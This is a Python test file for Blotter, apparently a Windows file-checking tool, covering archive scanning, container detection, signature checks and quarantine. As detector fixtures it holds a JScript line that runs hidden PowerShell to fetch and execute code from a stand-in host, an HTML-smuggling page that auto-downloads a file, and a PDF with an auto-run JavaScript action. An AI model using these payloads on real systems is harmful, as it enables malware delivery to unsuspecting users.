"""The 0.9.0 code review's fixes: files inside archives (H1), containers Blotter can't open
(H2), Defender switched off by another antivirus (H3), HTML smuggling, a PDF header after junk, online answers that
expire, and Blotter's icon. Then the second review's: scripts judged by their ending, one scope per file inside, more
containers that fail closed, the signature-check deadline, setup on ARM and the mark of the web."""

import base64
import bz2
import io
import lzma
import os
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time
import types
import unittest
import warnings
import zipfile
from pathlib import Path
from unittest import mock

from blotter import config, hashing, quarantine, shortcut, worker
from blotter.analyze import archives, filetype
from blotter.analyze import program as program_analysis
from blotter.cache import Cache
from blotter.checks import archive, capabilities, defender, pdf, scripts, signature
from blotter.checks import filetype as filetype_check
from blotter.checks import program as program_check
from blotter.findings import CLEAR, DISGUISED, NOTE, PACKED, SIGNED, SKIPPED, UNCHECKED, UNSIGNED, Finding
from blotter.runner import Runner
from blotter.verdict import decide
from tests import samples
from tests.test_runner_app import fake_check, wait_done

ROOT = Path(__file__).resolve().parent.parent
ENGINE_RAN = Finding("clamav", CLEAR, "ClamAV found nothing.")
WEAK_RULE = {"rules": {"allocate or change RWX memory": {"meta": {"namespace": "host-interaction/process/inject"}}}}


def put(name, data) -> Path:
    path = Path(tempfile.mkdtemp()) / "copy.blotter"
    path.write_bytes(data)
    hashing.remember(path, "0" * 64, name)
    return path


def msi() -> bytes:
    """An OLE file whose root entry has Windows Installer's class ID (what a real .msi has)."""
    ole = bytearray(samples.vba_project())
    shift = int.from_bytes(ole[0x1E:0x20], "little")
    at = ((int.from_bytes(ole[0x30:0x34], "little") + 1) << shift) + 0x50
    ole[at:at + 16] = bytes.fromhex("84100c0000000000c000000000000046")
    return bytes(ole)


def smuggling_page(download="invoice.iso") -> bytes:
    payload = base64.b64encode(bytes(range(256)) * 8)
    return (b"<html><body><script>var b64='" + payload + b"';var d=atob(b64);var a=new Uint8Array(d.length);"
            b"var blob=new Blob([a]);var u=URL.createObjectURL(blob);var l=document.createElement('a');l.href=u;"
            b"l.download='" + download.encode() + b"';l.click();</script></body></html>")


@unittest.skipUnless(sys.platform == "win32", "Windows' signature check")
class ArchiveMembersTests(unittest.TestCase):
    """H1: a program inside an archive gets the signature check, and the card says capa didn't look at it."""

    def setUp(self):
        self.exe = samples.pe_with_section(200_000)  # packed (random-looking code), unsigned

    def test_same_packed_unsigned_program_alone_and_in_a_zip(self):
        alone = put("tool.exe", self.exe)
        capa = capabilities.interpret(WEAK_RULE)
        self.assertEqual(decide(program_check.scan(alone) + signature.scan(alone) + capa)["verdict"], "suspicious")
        in_zip = archive.scan(put("tool.zip", samples.zip_of({"tool.exe": self.exe})))
        verdict = decide(in_zip + [ENGINE_RAN])["verdict"]
        self.assertNotEqual(verdict, "no_known_detections")
        self.assertEqual(verdict, "couldnt_fully_check")
        self.assertTrue(any(UNSIGNED in f.signals and f.details.get("scope") == "tool.exe" for f in in_zip))
        self.assertTrue(any("capa's deep check didn't look at the program inside" in f.text for f in in_zip))

    def test_through_the_sandboxed_worker_the_signature_is_checked_outside(self):
        found = worker.run("blotter.checks.archive", put("tool.zip", samples.zip_of({"tool.exe": self.exe})),
                           "tool.zip", "0" * 64, timeout=120)
        self.assertFalse(any(f.details.get("sign_later") for f in found))
        unsigned = [f for f in found if UNSIGNED in f.signals]
        self.assertEqual(unsigned[0].details["scope"], "tool.exe")
        self.assertTrue(unsigned[0].text.startswith("Inside the archive, tool.exe: It isn't digitally signed"))
        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check")

    def test_an_unpacked_program_inside_is_only_noted(self):
        found = archive.scan(put("t.zip", samples.zip_of({"small.exe": samples.minimal_pe()})))
        self.assertFalse(any(UNCHECKED in f.signals for f in found))
        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "no_known_detections")


class SignedMemberTests(unittest.TestCase):
    def capa_skipped(self, scope="tool.exe"):
        return [Finding("archive", NOTE, "packed", {"scope": scope}, [PACKED]),
                Finding("archive", NOTE, "capa didn't run", {"scope": scope, "capa_skipped": True}, [UNCHECKED])]

    def test_only_a_well_known_publisher_takes_the_unchecked_back(self):
        trusted = Finding("archive", CLEAR, "signed", {"scope": "tool.exe", "trusted_publisher": "Microsoft"}, [SIGNED])
        other = Finding("archive", CLEAR, "signed", {"scope": "tool.exe", "signed_by": "Someone"}, [SIGNED])
        unsigned = Finding("archive", NOTE, "unsigned", {"scope": "tool.exe"}, [UNSIGNED])
        self.assertEqual(decide(self.capa_skipped() + [trusted, ENGINE_RAN])["verdict"], "no_known_detections")
        self.assertEqual(decide(self.capa_skipped() + [other, ENGINE_RAN])["verdict"], "couldnt_fully_check")
        self.assertEqual(decide(self.capa_skipped() + [unsigned, ENGINE_RAN])["verdict"], "couldnt_fully_check")

    def test_another_files_signature_doesnt_count(self):
        signed = Finding("archive", CLEAR, "signed", {"scope": "other.exe", "trusted_publisher": "Microsoft"}, [SIGNED])
        self.assertEqual(decide(self.capa_skipped() + [signed, ENGINE_RAN])["verdict"], "couldnt_fully_check")

    def test_only_plain_copies_in_the_work_folder_are_signed(self):
        work = Path(tempfile.mkdtemp())
        (work / "sign").mkdir()
        outside = work / "elsewhere.exe"
        outside.write_bytes(b"MZ")
        bad = [Finding("archive", NOTE, "later", {"scope": "a.exe", "sign_later": rel})
               for rel in ("../elsewhere.exe", "elsewhere.exe", "sign/1.exe", r"C:\Windows\notepad.exe", 7)]
        with mock.patch("blotter.analyze.program.signature_findings") as sign:
            found = worker.sign_inside(bad, work)
        sign.assert_not_called()
        self.assertTrue(all("couldn't check its signature" in f.text and not f.details.get("sign_later")
                            for f in found))


class UnopenedContainerTests(unittest.TestCase):
    """H2: "Couldn't fully check", never "No known detections", for containers Blotter doesn't unpack."""

    def cases(self):
        iso = bytearray(0x9000)
        iso[0x8001:0x8006] = b"CD001"
        return {"disc.iso": (bytes(iso), "iso"), "disk.vhdx": (b"vhdxfile" + bytes(2000), "vhd"),
                "notes.one": (bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3") + bytes(500), "onenote"),
                "files.tar": (bytes(257) + b"ustar" + bytes(1000), "tar"), "files.cab": (b"MSCF" + bytes(500), "cab"),
                "files.tgz": (b"\x1f\x8b" + bytes(500), "gzip"), "setup.msi": (msi(), "msi"),
                "help.chm": (b"ITSF" + bytes(500), "chm"), "raw.img": (bytes(range(256)) * 40, "unknown")}

    def test_each_container_kind(self):
        for name, (data, real) in self.cases().items():
            path = put(name, data)
            self.assertEqual(filetype.detect(path).real, real, name)
            found = archive.scan(path)
            self.assertTrue(any(UNCHECKED in f.signals and f.details.get("unopened") for f in found), name)
            self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check", name)

    def test_inside_a_zip_too(self):
        iso = self.cases()["disc.iso"][0]
        found = archive.scan(put("mail.zip", samples.zip_of({"invoice.iso": iso})))
        self.assertTrue(any(UNCHECKED in f.signals and f.details.get("scope") == "invoice.iso" for f in found))
        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check")

    def test_a_disguised_installer_is_named(self):
        self.assertEqual(filetype.detect(put("x", msi())).kind, "program")
        self.assertTrue(filetype.compare(filetype.detect(put("x", msi())), "report.pdf")["disguised"])

    def test_ordinary_files_stay_as_they_were(self):
        for name, data in {"notes.txt": b"hello", "photo.jpg": b"\xff\xd8\xff" + bytes(100),
                           "old.doc": samples.vba_project()}.items():
            self.assertEqual(archive.scan(put(name, data))[0].level, "skipped", name)


class DefenderOffTests(unittest.TestCase):
    """H3: Defender switched off by another antivirus says so on the card and on the page."""

    def test_card_text_and_page_hint(self):
        [f] = defender.interpret(1, "ERROR: 0x800106ba", still_there=True)
        self.assertIn("answer Y to ClamAV", f.text)
        self.assertTrue(f.details["other_antivirus"])
        runner = Runner(Cache(Path(tempfile.mkdtemp()) / "c.sqlite3"), [fake_check("defender", ret=[f])])
        self.assertFalse(runner.defender_off())
        wait_done(runner.start(put("a.txt", b"x"), "a.txt", 1, "1" * 64))
        self.assertTrue(runner.defender_off())

    def test_page_and_readme(self):
        self.assertIn('id="defender-off"', (ROOT / "blotter" / "static" / "index.html").read_text(encoding="utf-8"))
        readme = (ROOT / "README.txt").read_text(encoding="utf-8")
        self.assertIn("another antivirus than Microsoft Defender", readme)
        self.assertIn("Windows on\nARM", readme.replace("\r\n", "\n"))


class SmugglingAndPdfTests(unittest.TestCase):
    def test_html_smuggling_is_at_least_unusual(self):
        self.assertEqual(decide(scripts.scan(put("invoice.html", smuggling_page())))["verdict"], "suspicious")
        self.assertEqual(decide(scripts.scan(put("page.htm", smuggling_page("data.bin"))))["verdict"], "unusual")
        self.assertEqual(decide(scripts.scan(put("logo.svg", smuggling_page("a.zip"))))["verdict"], "suspicious")

    def test_an_export_button_is_not_smuggling(self):
        page = b"<script>var b=new Blob([rows.join('\\n')]);a.href=URL.createObjectURL(b);a.download='data.csv';</script>"
        found = scripts.scan(put("report.html", page))
        self.assertEqual([f.level for f in found], [CLEAR])

    def test_smuggling_inside_a_zip(self):
        found = archive.scan(put("mail.zip", samples.zip_of({"invoice.html": smuggling_page()})))
        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "suspicious")

    def test_pdf_with_junk_before_its_header(self):
        data = b"junk" * 25 + b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) >> endobj\n%%EOF"
        path = put("invoice.pdf", data)
        self.assertEqual(filetype.detect(path).real, "pdf")
        found = pdf.scan(path)
        self.assertIn("pdf-header-moved", {f.details.get("ability") for f in found})
        self.assertEqual(decide(found)["verdict"], "suspicious")
        self.assertEqual(filetype.detect(put("x", b" " * 2000 + b"%PDF-1.7")).real, "text")  # past 1024: not a PDF

    def test_a_plain_pdf_has_no_header_note(self):
        found = pdf.scan(put("a.pdf", b"%PDF-1.7\n%%EOF"))
        self.assertEqual([f.level for f in found], [CLEAR])


class OnlineAnswerAgeTests(unittest.TestCase):
    def test_answers_older_than_seven_days_are_asked_again(self):
        self.assertEqual(config.ONLINE_MAX_AGE, 7 * 24 * 3600)
        db = Path(tempfile.mkdtemp()) / "c.sqlite3"
        cache = Cache(db)
        lookup = fake_check("lookup", cache=True)
        runner = Runner(cache, [lookup])
        wait_done(runner.start(put("a.txt", b"x"), "a.txt", 1, "2" * 64))
        wait_done(runner.start(put("a.txt", b"x"), "a.txt", 1, "2" * 64))
        self.assertEqual(len(lookup.calls), 1, "a fresh answer is remembered")
        with sqlite3.connect(db) as raw:
            raw.execute("UPDATE results SET checked_at = ?", (time.time() - 8 * 24 * 3600,))
        job = wait_done(runner.start(put("a.txt", b"x"), "a.txt", 1, "2" * 64))
        self.assertEqual(len(lookup.calls), 2, "an 8-day-old answer is asked again")
        self.assertIsNone(job.checks["lookup"]["cached_at"])
        self.assertIsNotNone(cache.get("2" * 64, "lookup", max_age=60), "the new answer replaced the old one")


class IconTests(unittest.TestCase):
    def test_page_favicon(self):
        from blotter import app
        self.assertTrue((app.STATIC / "blotter.ico").read_bytes().startswith(b"\x00\x00\x01\x00"))
        self.assertIn('<link rel="icon" href="/static/blotter.ico">', (app.STATIC / "index.html").read_text("utf-8"))
        self.assertEqual(app.TYPES[".ico"], "image/x-icon")

    @unittest.skipUnless(sys.platform == "win32", "Windows shortcuts")
    def test_shortcut_uses_the_icon(self):
        import os
        import subprocess
        base = Path(tempfile.mkdtemp())
        (base / "Start Blotter.bat").write_text("@echo off\r\n")
        (base / shortcut.ICON).parent.mkdir(parents=True)
        (base / shortcut.ICON).write_bytes((ROOT / shortcut.ICON).read_bytes())
        path = shortcut.make(base, base)
        read = subprocess.run([shortcut.powershell(), "-NoProfile", "-NonInteractive", "-Command",
                               "(New-Object -ComObject WScript.Shell).CreateShortcut($env:LNK).IconLocation"],
                              env=dict(os.environ, LNK=str(path)), capture_output=True, text=True, timeout=60)
        self.assertEqual(read.stdout.strip(), f"{base / shortcut.ICON},0")


class SetupPlaceTests(unittest.TestCase):
    def test_setup_offers_a_better_place(self):
        bat = (ROOT / "setup.bat").read_text(encoding="utf-8")
        self.assertIn('set "TARGET=%USERPROFILE%\\Blotter"', bat)
        self.assertIn('if /i not "%HERE:OneDrive=%"=="%HERE%" set "WHY=onedrive"', bat)
        self.assertIn("robocopy", bat)
        self.assertLess(bat.index("place_ok"), bat.index("1. Find Python"))


RUNS_POWERSHELL = (b"var s = new ActiveXObject('WScript.Shell');\n"
                   b"s.Run('powershell -w hidden -c iex(iwr http://blotter-test.invalid/a)');\n")


class ScriptEndingTests(unittest.TestCase):
    """Second review H1: Windows and browsers go by the ending, so the script and page checks do too."""

    def tricks(self):
        return {"// %PDF-1.7": lambda body: b"// %PDF-1.7\n" + body, "NUL byte": lambda body: body + b"\n\x00\n"}

    def assert_read_and_disguised(self, name, data, ability):
        path = put(name, data)
        found = scripts.scan(path)
        self.assertIn(ability, {f.details.get("ability") for f in found}, name)
        kind = filetype_check.scan(path)
        self.assertTrue(any(DISGUISED in f.signals for f in kind), name)
        self.assertEqual(decide(found + kind + [ENGINE_RAN])["verdict"], "suspicious", name)

    def test_a_script_with_a_trick_at_the_start(self):
        for trick in self.tricks().values():
            self.assert_read_and_disguised("a.js", trick(RUNS_POWERSHELL), "download-run")

    def test_a_web_page_with_a_trick_at_the_start(self):
        for trick in self.tricks().values():
            self.assert_read_and_disguised("a.html", trick(smuggling_page()), "html-smuggling")

    def test_the_same_inside_an_archive(self):
        for trick in self.tricks().values():
            found = archive.scan(put("mail.zip", samples.zip_of({"a.js": trick(RUNS_POWERSHELL),
                                                                 "b.html": trick(smuggling_page())})))
            for scope in ("a.js", "b.html"):
                mine = [f for f in found if f.details.get("scope") == scope]
                self.assertTrue(any(DISGUISED in f.signals for f in mine), scope)
                self.assertTrue(any(f.details.get("ability") in ("download-run", "html-smuggling") for f in mine), scope)
            self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "suspicious")

    def test_a_program_named_like_a_script_or_page(self):
        for name in ("a.js", "a.html", "a.svg"):
            self.assertTrue(filetype.compare(filetype.detect(put("x", samples.minimal_pe())), name)["disguised"], name)

    def test_real_text_isnt_disguised(self):
        cases = {"plain.js": b"console.log(1);\n", "empty.js": b"", "empty.html": b"",
                 "russian.html": "<p>{}</p>".format("\u041f\u0440\u0438\u0432\u0435\u0442 " * 200).encode("cp1251"),
                 "japanese.bat": "echo {}".format("\u3053\u3093\u306b\u3061\u306f" * 200).encode("shift_jis"),
                 "wide.ps1": "Write-Host hi".encode("utf-16"), "page.svg": b"<svg></svg>"}
        for name, data in cases.items():
            path = put(name, data)
            self.assertFalse(filetype.compare(filetype.detect(path), name)["disguised"], name)
            self.assertFalse(any(DISGUISED in f.signals for f in filetype_check.scan(path)), name)

    def test_text_in_an_older_encoding_is_still_read(self):
        data = RUNS_POWERSHELL + "// {}".format("\u041f\u0440\u0438\u0432\u0435\u0442 " * 200).encode("cp1251")
        self.assertIn("download-run", {f.details.get("ability") for f in scripts.scan(put("a.js", data))})

    def test_other_endings_stay_as_they_were(self):
        self.assertEqual(scripts.scan(put("a.pdf", b"%PDF-1.7\n%%EOF"))[0].level, SKIPPED)
        self.assertEqual(scripts.scan(put("a.bin", bytes(range(256))))[0].level, SKIPPED)
        self.assertFalse(filetype.compare(filetype.detect(put("x", b"a\x00b")), "a.dat")["disguised"])


def zip_listing(*entries) -> bytes:
    """A zip that lists names as often as given (samples.zip_of takes a dict, so each name once)."""
    buf = io.BytesIO()
    with warnings.catch_warnings(), zipfile.ZipFile(buf, "w") as z:
        warnings.simplefilter("ignore")
        for name, data in entries:
            z.writestr(name, data)
    return buf.getvalue()


class OneScopePerFileTests(unittest.TestCase):
    """Second review H2: a signature says something about one file inside, not about all files with its name."""

    def setUp(self):
        self.signed = samples.minimal_pe()
        self.packed = samples.pe_with_section(200_000)

    def fake_signature(self, _check, path, details=None):
        if Path(path).read_bytes() == self.signed:
            return [Finding("archive", CLEAR, "signed", {**details, "trusted_publisher": "Microsoft"}, [SIGNED])]
        return [Finding("archive", NOTE, "unsigned", dict(details), [UNSIGNED])]

    def scan(self, *entries):
        with mock.patch("blotter.analyze.program.signature_findings", self.fake_signature):
            return archive.scan(put("two.zip", zip_listing(*entries)))

    def test_ones_signature_cant_quiet_the_other(self):
        for entries in ([("setup.exe", self.signed), ("setup.exe", self.packed)],
                        [("setup.exe", self.packed), ("setup.exe", self.signed)]):
            found = self.scan(*entries)
            self.assertEqual({f.details.get("scope") for f in found if f.details.get("scope")},
                             {"setup.exe", "setup.exe#2"})
            self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check")

    def test_the_trusted_signature_still_counts_on_its_own_file(self):
        self.signed = self.packed
        found = self.scan(("setup.exe", self.packed))
        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "no_known_detections")

    def test_another_valid_signature_doesnt_waive_capa(self):
        def someone(_check, _path, details=None):
            return [Finding("archive", CLEAR, "signed", {**details, "signed_by": "Someone"}, [SIGNED])]
        with mock.patch("blotter.analyze.program.signature_findings", someone):
            found = archive.scan(put("one.zip", samples.zip_of({"setup.exe": self.packed})))
        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check")

    def test_the_second_file_keeps_its_ending(self):
        found = self.scan(("invoice.pdf.exe", self.signed), ("invoice.pdf.exe", self.signed))
        tricks = [f for f in found if f.details.get("ability") == "double-extension"]
        self.assertEqual({f.details["scope"] for f in tricks}, {"invoice.pdf.exe", "invoice.pdf.exe#2"})
        found = archive.scan(put("two.zip", zip_listing(("a.js", b"var a;"), ("a.js", RUNS_POWERSHELL))))
        self.assertTrue(any(f.details.get("ability") == "download-run" and f.details.get("scope") == "a.js#2"
                            for f in found))

    def test_nested_archives_with_the_same_name(self):
        inner = samples.zip_of({"tool.exe": self.packed})
        found = archive.scan(put("two.zip", zip_listing(("in.zip", inner), ("in.zip", inner))))
        self.assertTrue({"in.zip/tool.exe", "in.zip#2/tool.exe"} <= {f.details.get("scope") for f in found})

    def test_scopes_never_clash_and_are_never_empty(self):
        sweep = archive.Sweep()
        scopes = [sweep.unique_scope(n) for n in ("a", "a#2", "a", "a", "", "")]
        self.assertEqual(scopes, ["a", "a#2", "a#3", "a#4", "(no name)", "(no name)#2"])

    def test_a_damaged_zip_doesnt_lose_the_second_file(self):
        data = bytearray(zip_listing(("setup.exe", b"GOOD" * 10), ("broken.txt", b"x" * 50), ("setup.exe", b"EVIL" * 10)))
        table = data.find(b"PK\x01\x02")
        struct.pack_into("<I", data, data.find(b"PK\x01\x02", table + 4) + 16, 0x12345678)  # broken.txt's checksum
        seen = []
        archives.walk(put("t.zip", bytes(data)), "zip", lambda name, p: seen.append(p.read_bytes()[:4]),
                      archives.Budget())
        self.assertEqual(sorted(seen), [b"EVIL", b"GOOD", b"xxxx"])  # each once


class MoreContainersTests(unittest.TestCase):
    """Second review M1."""

    def magic_cases(self):
        return {"a.zst": (bytes.fromhex("28b52ffd") + bytes(500), "zstd"), "a.xz": (lzma.compress(b"x" * 500), "xz"),
                "a.bz2": (bz2.compress(b"x" * 500), "bzip2"), "a.ace": (bytes(7) + b"**ACE**" + bytes(500), "ace"),
                "a.arj": (b"\x60\xea\x22\x00" + bytes([34, 11, 1, 2, 0, 0, 2]) + bytes(500), "arj"),
                "a.lzh": (b"\x20\x00-lh5-" + bytes(500), "lzh")}

    def test_magic_bytes_also_under_another_name(self):
        for name, (data, real) in self.magic_cases().items():
            self.assertEqual(filetype.detect(put(name, data)).real, real, name)
            for shown in (name, "report.dat"):
                found = archive.scan(put(shown, data))
                self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check", shown)

    def test_endings_fail_closed_whatever_the_contents(self):
        for ending in "ace arj lzh zst tzst txz tbz2 uue z".split():
            for data in (bytes(range(256)) * 8, b"begin 644 a.exe\nM35\n"):
                found = archive.scan(put(f"a.{ending}", data))
                self.assertTrue(any(f.details.get("unopened") for f in found), ending)
                self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "couldnt_fully_check", ending)
                self.assertIn(f"a .{ending} file", found[0].text)

    def test_inside_a_zip_too(self):
        found = archive.scan(put("m.zip", samples.zip_of({"a.uue": b"begin 644 a.exe\n", "b.xz": lzma.compress(b"x")})))
        self.assertEqual({f.details["scope"] for f in found if f.details.get("unopened")}, {"a.uue", "b.xz"})

    def test_lookalikes_stay_text(self):
        for data in (b"BZh1 is how a note starts", b"xx-lh5- is what a note says"):
            self.assertEqual(filetype.detect(put("n.txt", data)).real, "text")
        self.assertEqual(filetype.detect(put("n.bin", b"\x60\xea" + bytes(500))).real, "unknown")


class SignatureDeadlineTests(unittest.TestCase):
    """Second review M3: a check only starts when it can finish before the deadline."""

    def run_with(self, seconds_each):
        work = Path(tempfile.mkdtemp())
        (work / "sign").mkdir()
        later = []
        for n in range(3):
            (work / "sign" / f"{n}.exe").write_bytes(b"MZ")
            later.append(Finding("archive", NOTE, "later", {"scope": f"{n}.exe", "sign_later": f"sign/{n}.exe"}))
        other = Finding("archive", NOTE, "something else inside", {"scope": "other.txt"})
        now = [1000.0]

        def check(_check, _path, details=None):
            now[0] += seconds_each
            return [Finding("archive", NOTE, "unsigned", dict(details), [UNSIGNED])]
        with mock.patch.object(worker, "time", types.SimpleNamespace(monotonic=lambda: now[0])), \
                mock.patch("blotter.analyze.program.signature_findings", check):
            return worker.sign_inside([other, *later], work), now[0] - 1000

    def test_a_slow_check_stops_the_next_ones_in_time(self):
        found, used = self.run_with(25)
        self.assertEqual(sum(UNSIGNED in f.signals for f in found), 1)
        self.assertEqual(sum("couldn't check its signature" in f.text for f in found), 2)
        self.assertIn("something else inside", [f.text for f in found])
        self.assertLessEqual(used + program_analysis.SIGNATURE_TIMEOUT - 25, worker.SIGN_TIME)

    def test_quick_checks_all_run(self):
        found, _ = self.run_with(1)
        self.assertEqual(sum(UNSIGNED in f.signals for f in found), 3)

    def test_the_runner_waits_long_enough(self):
        self.assertGreaterEqual(archive.EXTRA_TIME, worker.SIGN_TIME)
        self.assertGreater(worker.SIGN_TIME, program_analysis.SIGNATURE_TIMEOUT)


@unittest.skipUnless(sys.platform == "win32", "Windows' command prompt")
class SetupMessagesTests(unittest.TestCase):
    """Second review M4 and L1."""

    def setUp(self):
        self.bat = (ROOT / "setup.bat").read_text(encoding="utf-8")

    def run_start_of_setup(self, processor) -> str:
        folder = Path(tempfile.mkdtemp())
        start = self.bat[:self.bat.index("rem --- 0. A good place")]
        (folder / "start.bat").write_text(start + "echo GOES ON\r\n", encoding="utf-8")
        env = {**os.environ, "PROCESSOR_ARCHITECTURE": processor}
        env.pop("PROCESSOR_ARCHITEW6432", None)
        return subprocess.run(["cmd", "/c", str(folder / "start.bat")], env=env, stdin=subprocess.DEVNULL,
                              capture_output=True, text=True, timeout=30).stdout

    def test_setup_stops_on_arm(self):
        out = self.run_start_of_setup("ARM64")
        self.assertIn("ARM processor", out)
        self.assertNotIn("GOES ON", out)

    def test_setup_goes_on_elsewhere(self):
        out = self.run_start_of_setup("AMD64")
        self.assertNotIn("ARM processor", out)
        self.assertIn("GOES ON", out)

    def test_every_way_out_pauses_first(self):
        lines = [line.strip() for line in self.bat.splitlines()]
        exits = [n for n, line in enumerate(lines) if line.startswith("exit /b") or " exit /b" in line]
        self.assertTrue(exits)
        for n in exits:
            self.assertEqual(lines[n - 1], "pause", lines[n])

    def test_readme_mentions_the_new_folder(self):
        readme = (ROOT / "README.txt").read_text(encoding="utf-8")
        self.assertIn("that new folder", readme)
        self.assertIn("is your Blotter", readme)


class MarkOfTheWebTests(unittest.TestCase):
    """Second review L2: the mark survives a move between drives, or the file doesn't move."""

    MARK = b"[ZoneTransfer]\r\nZoneId=3\r\n"

    def setUp(self):
        self.folder = Path(tempfile.mkdtemp())
        self.file = self.folder / "tool.exe"
        self.file.write_bytes(b"hello")
        self.sha = hashing.sha256_stream(io.BytesIO(b"hello"))
        self.mark_it(self.file)
        patcher = mock.patch.object(config, "QUARANTINE", self.folder / "quarantine")
        patcher.start()
        self.addCleanup(patcher.stop)

    def mark_it(self, path):
        try:
            with open(str(path) + quarantine.MARK, "wb") as f:
                f.write(self.MARK)
        except OSError:
            self.skipTest("this disk has no file streams")

    def mark_of(self, path):
        with open(str(path) + quarantine.MARK, "rb") as f:
            return f.read()

    def other_drive(self):
        """os.replace fails between drives; the index file and the finished copy move as usual."""
        real = os.replace

        def replace(source, target):
            if not str(source).endswith((".part", ".tmp")):
                raise OSError(17, "not the same device")
            return real(source, target)
        return mock.patch("blotter.quarantine.os.replace", replace)

    def test_across_drives_and_back(self):
        with self.other_drive():
            entry = quarantine.put(self.file, self.sha)
            self.assertFalse(self.file.exists())
            self.assertEqual(self.mark_of(entry["stored"]), self.MARK)
            quarantine.restore(entry["id"])
        self.assertEqual(self.file.read_bytes(), b"hello")
        self.assertEqual(self.mark_of(self.file), self.MARK)

    def test_same_drive_keeps_it_as_before(self):
        entry = quarantine.put(self.file, self.sha)
        quarantine.restore(entry["id"])
        self.assertEqual(self.mark_of(self.file), self.MARK)

    def test_a_file_without_a_mark_doesnt_get_one(self):
        plain = self.folder / "plain.exe"
        plain.write_bytes(b"hello")
        with self.other_drive():
            entry = quarantine.put(plain, self.sha)
            self.assertRaises(FileNotFoundError, self.mark_of, entry["stored"])

    def test_when_the_mark_cant_be_kept_nothing_moves(self):
        with self.other_drive(), mock.patch("blotter.quarantine._copy_mark", side_effect=OSError(87, "no streams")):
            with self.assertRaisesRegex(quarantine.QuarantineError, "mark"):
                quarantine.put(self.file, self.sha)
        self.assertEqual(self.file.read_bytes(), b"hello")
        self.assertEqual(self.mark_of(self.file), self.MARK)
        self.assertEqual(list((self.folder / "quarantine").glob("*.part")), [])


class PdfNoteTests(unittest.TestCase):
    """Second review L3: junk before the header is a note; it doesn't raise the answer by itself."""

    def test_stays_a_note(self):
        found = pdf.scan(put("a.pdf", b"junk" * 25 + b"%PDF-1.7\n%%EOF"))
        note = [f for f in found if f.details.get("ability") == "pdf-header-moved"]
        self.assertEqual([f.level for f in note], [NOTE])
        self.assertEqual(decide(found + [ENGINE_RAN])["verdict"], "no_known_detections")
        changes = (ROOT / "CHANGES.txt").read_text(encoding="utf-8")
        self.assertIn("the note alone doesn't change the answer", changes.replace("\n", " "))


if __name__ == "__main__":
    unittest.main()
